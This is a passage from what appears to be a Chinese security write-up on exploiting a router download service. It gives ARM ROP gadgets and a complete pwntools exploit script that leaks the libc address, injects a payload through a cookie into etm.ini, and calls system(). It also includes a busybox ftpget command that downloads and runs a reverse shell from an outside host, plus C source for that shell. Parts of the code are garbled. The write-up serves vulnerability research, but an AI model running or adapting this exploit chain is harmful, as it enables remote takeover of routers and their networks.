        NX:       NX enabled
        PIE:      No PIE (0x8000)
程序开启了NX保护，所以我们要通过ROP来执行代码
另外需要注意的是，虽然没有开启ASLR保护，但是每次路由器重新启动会导致libc加载基址改变
所以才需要之前的Info Leak漏洞来泄露libc基址
在编写ROP之前，我们需要知道ROP中不可使用的字符
  1. \x00 
    * \x00会截断攻击者的输入，\x00之后的内容不会被写入etm.ini配置文件
  2. 分号 ;
    * 分号作为cookie的分隔符，具有特殊含义，同样会截断攻击者输入
  3. 换行 \n 
    * 在配置文件中每个配置项是通过\n分割，所有\n通用会截断攻击者输入
针对\x00限制的解决方案是，我们可以使用libc中的gadgets来进行ROP，因为libc常被加载于高地址内存
### 3.2 ARM ROP
构造ROP的思路是调用system函数执行命令来下载reverse shell，然后在路由器执行reverse shell，进而拿到路由器的控制权
路由器上的命令都是由busybox提供，功能有限，经过对这些命令的研究，我发现ftpget可用于下载文件
通过下面的命令可以从10.101.170.30(ftpserver)上下载reshell到本地/bin/reshell
    /bin/busybox ftpget -g -l /bin/reshell -r reshell 10.101.170.30
ROP gadgets可以使用ROPgadget工具来寻找
ARM汇编可以参考：
这里讲解一下我们在编写这个漏洞利用代码时使用到的ARM汇编
从栈上pop出r0, lr，然后bx跳转到lr。这个gadget用于设置寄存器的值
    0x00053a10 pop {r0, lr} ; bx lr;
将r0中的值写入r4指向的内存中，然后从栈上pop出r4和lr，然后bx跳转到lr
这个gadget用于将寄存器中的值写入.data段，可用于构造要执行的命令字符串
    0x0002E4F8 str r0, [r4] ; pop {r4, lr} ; bx lr
在使用gadgets向.data写入数据时不能写入\x00，所以需要使用"||"将要执行的命令和.data段后面的垃圾数据隔离
最终需要写入.data的字符串为
    /bin/busybox ftpget -g -l /bin/reshell -r reshell 10.101.170.30 && chmod +x /bin/reshell && /bin/reshell ||
### 3.3 reverse tcp backdoor
参考github上别人写的bind shell写了个reverse shell，下面是reshell的代码
直接gcc静态编译即可
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define REMOTE_ADDR "1.1.1.1"
    #define REMOTE_PORT    9999
    // Thanks to OsandaMalith's Bind Shell
    // https://gist.github.com/OsandaMalith/a3b213b5e7582cf9aac3
    int main() {
        int i, s = 0;
        char *banner = "[~] Welcome to @Dlive's Reverse Shell\n";
        char *args[] = { "/bin/busybox", "sh", (char *) 0 };
        struct sockaddr_in sa;
        socklen_t len = 0;
        sa.sin_family = AF_INET;
        sa.sin_port = htons(REMOTE_PORT);
        sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
        s = socket(AF_INET, SOCK_STREAM, 0);
        connect(s, (struct sockaddr *)&sa, sizeof(sa));
        for(; i  /etc/1.txt'
    COMMAND = '/bin/busybox ftpget -g -l /bin/reshell -r reshell 10.101.170.30 && chmod +x /bin/reshell && /bin/reshell'
    elf = ELF('./etm')
    # this libc is libuClibc-0.9.32.1-git.so
    libc = ELF('./libc.so.0')
    context.log_level = 'debug'
    def http_req(path, cookie=None):
        http_req = 'GET {} HTTP/1.1\r\n'.format(path)
        http_req += 'Host: {}:{}\r\n'.format(HOST, PORT)
        if cookie:
            http_req += 'Cookie: {}\r\n'.format(cookie)
        http_req += '\r\n'
        print http_req
        return http_req
    # -------- leak uclibc address -------    p = remote(HOST, PORT)
    url = '/login?callback={}'.format('A'*0x200)
    p.send(http_req(url))
    http_rsp = p.recvall()
    libc.address = u32(http_rsp[0x108:0x108+4]) - 0x65dac
    print '[+]libc address: ', hex(libc.address)
    raw_input('#DEBUG#')
    print http_rsp
    # ----------  etm.ini injection ---------    
    p = remote(HOST, PORT)
    def generate_payload(command):
        print '[+]command is ', command
        command += ' ||'     # do not use ';' to connect command. beause ';' is separator of cookie value
        for j in range(20):
            data = p32(libc.address + 0x00061288 + j)
            # 0x00053a10 pop {r0, lr} ; bx lr;
            pop_r0_lr_bx_lr = p32(libc.address + 0x00053a10)
            # 0x0002b3d0 pop {r4, lr} ; bx lr ;
            pop_r4_lr_bx_lr = p32(libc.address + 0x0002b3d0)
            # 0x0002E4F8 str r0, [r4] ; pop {r4, lr} ; bx lr
            str_r0_r4_pop_r4_lr_bx_lr = p32(libc.address + 0x0002E4F8)
            payload  = cyclic(176)                              # padding
            # write command to .data
            for i in range(len(command) / 4):
                payload += pop_r4_lr_bx_lr
                payload += p32(u32(data) + i * 4)                # r3 = .data
                payload += pop_r0_lr_bx_lr
                payload += command[i*4:(i+1)*4].ljust(4,'B')     # r0 = command[0:4]
                payload += str_r0_r4_pop_r4_lr_bx_lr             # [r4] = r0
                payload += 'AAAA'                                # padding
            # call system
            payload += pop_r0_lr_bx_lr
            payload += data
            payload += p32(libc.symbols['system'])
            if ('\x00' not in payload) and (';' not in payload) and ('\n' not in payload):
                return payload
        return False
    payload = generate_payload(COMMAND)
    if not payload:
        print '[-]Can not Generate Payload'
        sys.exit(-1)
    cookie = "isvip=0; jumpkey=A\n\n[license]\nserver_addr={}; usernick=B; userid=1".format(payload)
    url = '/login?userID=A&clientID=A&scope=1&token=1&v=1'
    p.send(http_req(url, cookie))
    http_rsp = p.recvall()
    print http_rsp
    # ---------- restart ----------------    raw_input('#DEBUG#')
    p = remote(HOST, PORT)
    url = '/stopthunder'
    p.send(http_req(url))
    http_rsp = p.recvall()
    print http_rsp
## 5\. 参考资料
  1. 实战栈溢出：三个漏洞搞定一台路由器  